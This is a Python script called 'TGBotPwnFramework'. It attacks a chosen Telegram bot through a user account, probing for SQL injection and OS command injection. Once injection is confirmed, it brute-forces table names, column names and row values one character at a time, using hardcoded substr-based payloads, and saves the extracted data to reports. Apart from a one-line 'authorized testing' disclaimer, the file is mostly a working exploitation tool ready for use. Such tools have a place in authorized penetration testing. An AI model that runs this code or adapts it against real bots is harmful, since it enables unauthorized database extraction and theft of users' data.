#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import time
import json
import os
import aiohttp
from datetime import datetime
from typing import List, Dict, Optional, Any

from telethon import TelegramClient
from telethon.tl.types import User
from telethon.errors.rpcerrorlist import FloodWaitError
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from thefuzz import fuzz

def load_config() -> Dict[str, Any]:
    """
    Loads all configurations from external files. Exits if files are missing.
    """
    try:
        if not os.path.exists('config.json'):
            print("FATAL ERROR: Configuration file 'config.json' not found. Please create it.")
            exit(1)
            
        with open('config.json', 'r', encoding='utf-8') as f:
            config = json.load(f)
            
        # Set default values for robustness
        config.setdefault('default_timeout', 15)
        config.setdefault('fuzz_ratio_threshold', 85)
        config.setdefault('time_delay_threshold', 5)
        config.setdefault('brute_force_row_limit', 10)
        
        config['common_tables'] = []
        if os.path.exists('tables.txt'):
            with open('tables.txt', 'r', encoding='utf-8') as f:
                config['common_tables'] = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        else:
            print("Warning: 'tables.txt' not found. Defaulting to an empty list.")
        
        config['charset'] = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_@.'
        if os.path.exists('charset.txt'):
            with open('charset.txt', 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    config['charset'] = content
        else:
            print("Warning: 'charset.txt' not found. Using default charset.")

        config['sqli_payloads'] = []
        if os.path.exists('sqli_payloads.txt'):
            with open('sqli_payloads.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if line.strip() and not line.startswith('#'):
                        method, db, payload = line.strip().split(':', 2)
                        config['sqli_payloads'].append({"method": method, "db": db, "payload": payload})
        else:
            print("Warning: 'sqli_payloads.txt' not found.")

        config['cmd_payloads'] = []
        if os.path.exists('cmd_payloads.txt'):
            with open('cmd_payloads.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if line.strip() and not line.startswith('#'):
                        os_type, payload = line.strip().split(':', 1)
                        config['cmd_payloads'].append({"os": os_type, "payload": payload})
        else:
            print("Warning: 'cmd_payloads.txt' not found.")

        if config.get('API_ID') == 1234567 or not config.get('API_HASH'):
            print("FATAL ERROR: Please configure your API_ID and API_HASH in 'config.json'.")
            exit(1)
            
        return config
    except (ValueError, IndexError):
        print("FATAL ERROR: A payload file has an incorrect format. Please check 'sqli_payloads.txt' and 'cmd_payloads.txt'.")
        exit(1)

CONFIG = load_config()

async def async_prompt_ask(prompt: str, choices: Optional[List[str]] = None, default: Optional[str] = None) -> str:
    """Non-blocking prompt ask to avoid starving the asyncio event loop."""
    return await asyncio.to_thread(Prompt.ask, prompt, choices=choices, default=default)

async def async_int_prompt_ask(prompt: str, choices: Optional[List[str]] = None) -> int:
    """Non-blocking int prompt ask to avoid starving the asyncio event loop."""
    return await asyncio.to_thread(IntPrompt.ask, prompt, choices=choices)

async def query_online_worker(question: str, console: Console) -> str:
    worker_url = CONFIG.get("WORKER_URL", "")
    if "your-worker" in worker_url or not worker_url:
        return "[bold yellow]Warning: AI Worker URL is not configured in 'config.json'.[/bold yellow]"
    
    console.print(f"\n⚡️ [cyan]Sending question to AI worker:[/cyan] '{question}'")
    headers = {"Content-Type": "application/json"}
    data = {"question": question}
    
    try:
        # Use asyncio.sleep instead of rich status blocking context for fully non-blocking IO
        console.print("[bold green]Waiting for AI response...[/bold green]")
        async with aiohttp.ClientSession() as session:
            async with session.post(worker_url, json=data, headers=headers, timeout=90) as response:
                response.raise_for_status()
                ai_response = await response.json()
                return ai_response.get("response", "پاسخ معتبری از ورکر دریافت نشد.")
    except aiohttp.ClientError as e:
        return f"[bold red]Error connecting to AI worker: {e}[/bold red]"
    except asyncio.TimeoutError:
        return "[bold red]Timeout error connecting to AI worker.[/bold red]"
    except Exception as e:
        return f"[bold red]Unexpected error: {e}[/bold red]"

class ResponseAnalyzer:
    def __init__(self, console: Console):
        self.console = console
        self.baseline_avg_time = 0.0
        self.baseline_text = ""

    async def establish_baseline(self, conversation, base_payload: str) -> bool:
        self.console.print("[cyan]Establishing baseline response signature...[/cyan]")
        times, text_samples = [], []
        try:
            for _ in range(3):
                start_time = time.time()
                await conversation.send_message(base_payload)
                response = await conversation.get_response(timeout=CONFIG.get('default_timeout', 15))
                times.append(time.time() - start_time)
                text_samples.append(response.text)
                await asyncio.sleep(0.5)

            self.baseline_avg_time = sum(times) / len(times)
            self.baseline_text = text_samples[0]
            self.console.print(f"[green]Baseline Established:[/green] Avg Time: {self.baseline_avg_time:.2f}s")
            return True
        except Exception as e:
            self.console.print(f"[bold red]Failed to establish baseline: {e}[/bold red]")
            return False

    def is_boolean_true(self, response_text: str, true_text_signature: str) -> bool:
        return fuzz.ratio(response_text, true_text_signature) > CONFIG.get('fuzz_ratio_threshold', 85)

    def is_time_delay_significant(self, response_time: float) -> bool:
        return (response_time - self.baseline_avg_time) > CONFIG.get('time_delay_threshold', 5)

class VulnerabilityTester:
    def __init__(self, client: TelegramClient, target_entity, console: Console, on_finding: callable):
        self.client = client
        self.target_entity = target_entity
        self.console = console
        self.on_finding = on_finding
        self.analyzer = ResponseAnalyzer(console)

    async def _interactive_ai_prompt(self, context_message: str):
        self.console.print(Panel(f"[dim]{context_message}[/dim]", title="[bold blue]🧠 AI Assistant[/bold blue]", border_style="blue"))
        choice = await async_prompt_ask("[cyan]Would you like to ask the AI for help?[/cyan]", choices=["y", "n"], default="n")
        if choice.lower() == 'y':
            question = await async_prompt_ask("[yellow]Your question for the AI[/yellow]")
            if question:
                # Include the context message implicitly so the AI knows what's happening
                contextual_question = f"Context of the current scan: {context_message}\nUser question: {question}"
                answer = await query_online_worker(contextual_question, self.console)
                self.console.print(Panel(answer, title="[bold green]🤖 AI Response[/bold green]", border_style="green"))
                await async_prompt_ask("[dim]Press Enter to continue...[/dim]")

    async def _test_payload(self, payload: str) -> Optional[Dict[str, Any]]:
        for retry in range(3):
            try:
                start_time = time.time()
                async with self.client.conversation(self.target_entity, timeout=CONFIG.get('default_timeout', 15)) as conv:
                    await conv.send_message(payload)
                    response = await conv.get_response()
                return {"text": response.text, "time": time.time() - start_time}
            except FloodWaitError as e:
                self.console.print(f"[bold yellow]Telegram flood wait triggered. Sleeping for {e.seconds}s...[/bold yellow]")
                await asyncio.sleep(e.seconds + 5)
            except Exception:
                return None
        return None

    async def run_sqli_test(self, template: str):
        self.console.print("\n" + "="*60)
        self.console.print("[bold yellow]-- MODULE: SQL INJECTION --[/bold yellow]")
        await self._interactive_ai_prompt("You are about to run a comprehensive SQL Injection test using payloads from 'sqli_payloads.txt'.")
        
        self.console.print("\n[cyan]Phase 1: Attempting Boolean-Based Detection...[/cyan]")
        true_payload_info = next((p for p in CONFIG['sqli_payloads'] if p['method'] == 'BOOLEAN' and '1=1' in p['payload']), None)
        false_payload_info = next((p for p in CONFIG['sqli_payloads'] if p['method'] == 'BOOLEAN' and '1=2' in p['payload']), None)

        if not true_payload_info or not false_payload_info:
            self.console.print("[red]Error: Boolean payloads not found in 'sqli_payloads.txt'. Skipping phase.[/red]")
        else:
            true_payload = template.format(true_payload_info['payload'])
            false_payload = template.format(false_payload_info['payload'])
            
            true_resp = await self._test_payload(true_payload)
            false_resp = await self._test_payload(false_payload)

            if true_resp and false_resp and fuzz.ratio(true_resp['text'], false_resp['text']) < (100 - CONFIG.get('fuzz_ratio_threshold', 85)):
                self.console.print("[bold green]✅ Success! Boolean-Based SQLi detected.[/bold green]")
                self.on_finding({"type": "SQLi", "method": "Boolean-Based", "severity": "High", "payload": true_payload})
                await self._exfiltrate_data_sqli_boolean(template, true_resp['text'])
                return

        self.console.print("[yellow]Boolean-Based detection inconclusive. Falling back to Time-Based.[/yellow]")
        
        self.console.print("\n[cyan]Phase 2: Attempting Time-Based Detection...[/cyan]")
        delay = CONFIG.get('time_delay_threshold', 5) + 1
        
        async with self.client.conversation(self.target_entity) as conv:
            if not await self.analyzer.establish_baseline(conv, template.format("baseline'")): return
        
        time_payloads = [p for p in CONFIG['sqli_payloads'] if p['method'] == 'TIME']
        for p_info in time_payloads:
            payload = template.format(p_info['payload'].format(delay=delay))
            self.console.print(f"Testing for {p_info['db']}...")
            response = await self._test_payload(payload)
            if response and self.analyzer.is_time_delay_significant(response['time']):
                self.console.print(f"[bold red]✅ VULNERABILITY CONFIRMED: Time-Based Blind SQL Injection ({p_info['db']})[/bold red]")
                self.on_finding({"type": "SQLi", "method": f"Time-Based ({p_info['db']})", "severity": "High", "payload": payload})
                return
        
        self.console.print("[bold yellow]SQL Injection not detected in any phase.[/bold yellow]")

    async def _exfiltrate_data_sqli_boolean(self, template: str, true_signature: str):
        self.console.print("\n[cyan]-- Starting Data Exfiltration via Boolean-Based method --[/cyan]")
        
        found_tables = []
        for table in CONFIG.get('common_tables', []):
            self.console.print(f"Checking for table: [magenta]{table}[/magenta]...", end='\r')
            check_payload = template.format(f"' AND (SELECT 1 FROM {table} LIMIT 1)='1'--")
            resp = await self._test_payload(check_payload)
            if resp and self.analyzer.is_boolean_true(resp['text'], true_signature):
                self.console.print(f"[bold green]✔️ Table Found: {table}{' '*20}[/bold green]")
                found_tables.append(table)
        if not found_tables: self.console.print("[yellow]No common tables found.[/yellow]"); return

        for table in found_tables:
            columns, i = [], 0
            while True:
                query = f"SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {i}"
                col_name = await self._brute_force_query(template, query, true_signature)
                if col_name: columns.append(col_name); i+=1
                else: break
            self.console.print(f"Columns in '{table}': [cyan]{', '.join(columns)}[/cyan]")

            for col in columns:
                self.console.print(f"\n[magenta]Dumping data from {table}.{col}...[/magenta]")
                for i in range(CONFIG.get('brute_force_row_limit', 10)):
                    query = f"SELECT {col} FROM {table} LIMIT 1 OFFSET {i}"
                    value = await self._brute_force_query(template, query, true_signature)
                    if value:
                        self.console.print(f"[bold red]  Row {i+1}: {value}[/bold red]")
                        self.on_finding({"type": "Exfiltrated Data", "source": f"{table}.{col}", "value": value})
                    else: break

    async def _brute_force_query(self, template: str, query: str, true_signature: str) -> str:
        result = ""
        charset = CONFIG.get('charset', 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_@.')
        for i in range(1, 101):
            found_char = False
            for char in charset:
                test_char = f"'{char}'" if char != "'" else "''''"
                payload = template.format(f"' AND substr(({query}),{i},1)={test_char}--")
                resp = await self._test_payload(payload)
                if resp and self.analyzer.is_boolean_true(resp['text'], true_signature):
                    result += char
                    self.console.print(f"[dim]Brute-forcing... [reset]'{result}'", end="\r")
                    found_char = True
                    break
            if not found_char: break
        self.console.print(" " * (len(result) + 20), end="\r")
        return result

    async def run_command_injection_test(self, template: str):
        self.console.print("\n" + "="*60)
        self.console.print("[bold yellow]-- MODULE: COMMAND INJECTION --[/bold yellow]")
        await self._interactive_ai_prompt("This module tests for OS Command Injection using time-based payloads from 'cmd_payloads.txt'.")
        delay = CONFIG.get('time_delay_threshold', 5) + 1

        async with self.client.conversation(self.target_entity) as conv:
            if not await self.analyzer.establish_baseline(conv, template.format("test_baseline")): return

        for p_info in CONFIG['cmd_payloads']:
            payload_template = p_info['payload'].format(delay=delay)
            full_payload = template.format(payload_template)
            self.console.print(f"Testing ({p_info['os']}): [dim]{p_info['payload']}[/dim]")
            response = await self._test_payload(full_payload)
            if response and self.analyzer.is_time_delay_significant(response['time']):
                self.console.print(f"[bold red]✅ VULNERABILITY CONFIRMED: Time-Based Command Injection[/bold red]")
                self.on_finding({"type": "Command Injection", "method": "Time-Based", "severity": "Critical", "payload": full_payload})
                return

        self.console.print("[bold yellow]Command Injection not detected.[/bold yellow]")

class TelegramBotPentestFramework:
    def __init__(self, bot_username: str):
        self.bot_username = bot_username
        self.client = TelegramClient('TBPenter', CONFIG['API_ID'], CONFIG['API_HASH'])
        self.console = Console()
        self.target_entity = None
        self.findings: List[Dict] = []
        self.tester = VulnerabilityTester(self.client, None, self.console, self.findings.append)

    async def connect(self) -> bool:
        self.console.print("[cyan]Connecting to Telegram...[/cyan]")
        try:
            await self.client.start()
            self.target_entity = await self.client.get_entity(self.bot_username)
            self.tester.target_entity = self.target_entity
            if not (isinstance(self.target_entity, User) and self.target_entity.bot):
                self.console.print(f"[bold red]Error: '{self.bot_username}' is not a bot.[/bold red]")
                return False
            self.console.print(f"[bold green]Successfully connected to bot: {self.target_entity.first_name}[/bold green]")
            return True
        except ValueError:
            self.console.print(f"[bold red]Error: Bot username '{self.bot_username}' not found.[/bold red]")
            return False
        except Exception as e:
            self.console.print(f"[bold red]An unexpected error occurred during connection: {e}[/bold red]")
            return False

    def generate_report(self):
        from rich.table import Table
        
        if not self.findings: self.console.print("[yellow]No findings to report.[/yellow]"); return
        self.console.print(f"\n[bold yellow]-- Generating Report --[/bold yellow]")
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        
        # Save JSON Report
        json_filename = f"pentest_report_{self.bot_username.replace('@','')}_{timestamp}.json"
        report_data = { "target": self.bot_username, "scan_time": timestamp, "total_findings": len(self.findings), "findings": self.findings }
        with open(json_filename, 'w', encoding='utf-8') as f: json.dump(report_data, f, indent=4, ensure_ascii=False)
        self.console.print(f"[bold green]JSON report successfully saved to: {json_filename}[/bold green]")
        
        # Print Rich Summary Table
        table = Table(title=f"Scan Summary for {self.bot_username}")
        table.add_column("Type", style="cyan", no_wrap=True)
        table.add_column("Method / Source", style="magenta")
        table.add_column("Severity / Value", justify="right", style="green")
        
        html_findings = ""
        for finding in self.findings:
            if finding['type'] == 'Exfiltrated Data':
                html_findings += f"<div class='finding'><h3 style='color:#a5d6a7'>Exfiltrated Data</h3><p><strong>Source:</strong> {finding.get('source', '')}</p><p><strong>Value:</strong> <span class='payload'>{finding.get('value', '')}</span></p></div>"
                table.add_row("Exfiltrated Data", finding.get('source', ''), finding.get('value', ''))
            else:
                sev = finding.get('severity', 'Medium')
                html_findings += f"<div class='finding {sev}'><h3>{finding.get('type')}</h3><p><strong>Method:</strong> {finding.get('method')}</p><p><strong>Severity:</strong> {sev}</p><p><strong>Payload used:</strong></p><div class='payload'>{finding.get('payload')}</div></div>"
                sev_color = "red" if sev in ["High", "Critical"] else "yellow"
                table.add_row(finding.get('type'), finding.get('method'), f"[{sev_color}]{sev}[/{sev_color}]")
                
        self.console.print(table)
        
        # Save HTML Report
        html_filename = f"pentest_report_{self.bot_username.replace('@','')}_{timestamp}.html"
        try:
            with open('report_template.html', 'r', encoding='utf-8') as tmpl:
                template_content = tmpl.read()
            html_content = template_content.replace('{TARGET}', self.bot_username).replace('{TIME}', timestamp).replace('{TOTAL}', str(len(self.findings))).replace('{FINDINGS_HTML}', html_findings)
            with open(html_filename, 'w', encoding='utf-8') as f: f.write(html_content)
            self.console.print(f"[bold green]HTML report successfully saved to: {html_filename}[/bold green]")
        except FileNotFoundError:
            self.console.print("[yellow]Notice: 'report_template.html' not found. HTML report generation skipped.[/yellow]")

    async def disconnect(self):
        await self.client.disconnect()
        self.console.print("\n[cyan]Disconnected.[/cyan]")

async def main():
    console = Console()
    console.print(Panel("[bold green]TGBotPwnFramework v1.0 [/bold green]", expand=False))
    console.print("This tool is for educational and authorized security testing purposes only.\n")

    # The first prompt can remain synchronous or be async. Using async for consistency.
    bot_username = await async_prompt_ask("[cyan]۱. Enter the target bot's username (e.g., @mybot)[/cyan]")
    framework = TelegramBotPentestFramework(bot_username)
    if not await framework.connect(): return

    while True:
        console.print(Panel("[bold blue]-- Main Test Menu --[/bold blue]", expand=False))
        console.print("1. Run Full Scan (SQLi + Command Injection)")
        console.print("2. Run SQL Injection Test Only")
        console.print("3. Run Command Injection Test Only")
        console.print("4. Generate Report & Exit")
        console.print("5. Exit Without Report")
        
        choice = await async_int_prompt_ask("[cyan]Select an option[/cyan]", choices=['1','2','3','4','5'])
        
        if choice in [1, 2, 3]:
            template = await async_prompt_ask("[cyan]Enter the command template to test (use {} as placeholder)\n(e.g., /search {} or /vote '{}')[/cyan]")
            if "{}" not in template:
                console.print("[bold red]Template must include '{}' for payload injection.[/bold red]"); continue

            if choice == 1:
                await framework.tester.run_sqli_test(template)
                await framework.tester.run_command_injection_test(template)
            elif choice == 2: await framework.tester.run_sqli_test(template)
            elif choice == 3: await framework.tester.run_command_injection_test(template)
        elif choice == 4: framework.generate_report(); break
        elif choice == 5: break
            
    await framework.disconnect()
    console.print("[bold green]Scan finished.[/bold green]")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, EOFError):
        print("\nExiting...")
